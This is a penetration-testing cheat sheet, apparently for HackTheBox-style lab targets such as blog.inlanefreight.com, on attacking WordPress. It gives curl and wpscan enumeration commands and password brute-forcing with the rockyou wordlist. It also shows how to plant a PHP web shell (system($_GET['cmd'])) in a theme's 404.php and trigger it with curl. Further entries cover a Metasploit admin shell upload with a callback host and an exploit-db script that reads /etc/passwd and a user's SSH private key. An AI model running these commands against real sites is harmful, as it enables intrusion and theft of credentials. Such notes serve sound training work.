## Enumeration 
#### version, plugin enumeration 
```bash
# wordpress version 
curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'
curl -s -X GET http://blog.inlanefreight.com | grep 'ver='

# installed themes
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2

# user enumeration
http://blog.inlanefreight.com/?author=1
curl -s -I -X GET http://blog.inlanefreight.com/?author=1
curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
```

#### WPscan 
```bash
gem install wpscan
wpscan --hh

# api-token - https://wpvulndb.com/
wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>

wpscan --url http://dc-2 --enumerate p --enumerate t --enumerate u
wpscan --url http://blog.inlanefreight.com --enumerate ap
--enumerate at (all themes) 
--enumerate ap (all plugins) 
--enumerate cb (config backups) 
--enumerate dbe (database exports)
```

#### login bruteforcing 
```bash
# WPscan xmlrpc api 
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

# wpscan wp-login
sudo wpscan --password-attack wp-login -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

<br>
<br>

## Attacking WordPress 
#### Authenticated RCE
With access to administrator console we can modify the theme & edit the uncommon page `404.php` to add a web shell or php-reverse-shell
`Appearance -> Edit Themes -> select them from dropdown -> 404.php`

![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/6ad7200b-38e5-496a-a6cc-b2fbf8f7fc1c)

```php
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
<SNIP>
```

```bash 
# curl to obtain RCE
curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"

uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
```
<br> 

#### Authenticated RCE (metasploit) 
```bash
exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.com
exploit(unix/webapp/wp_admin_shell_upload) > set username admin
exploit(unix/webapp/wp_admin_shell_upload) > set password Winter2020
exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.8
exploit(unix/webapp/wp_admin_shell_upload) > run
```

<br> 

#### Duplicator Plugin - Unauthenticated Arbitrary File Read 
https://www.exploit-db.com/exploits/50420

```bash
python3 50420.py http://192.168.219.244 /etc/passwd
python3 50420.py http://192.168.219.244 /home/daniela/.ssh/id_rsa
```

<br> 

#### Git Repo (PrivEsc) 
Git Repo may be used with WordPress and may contain sensitive information 
- the common location is `/srv/www/wordpress` 

<br> 
















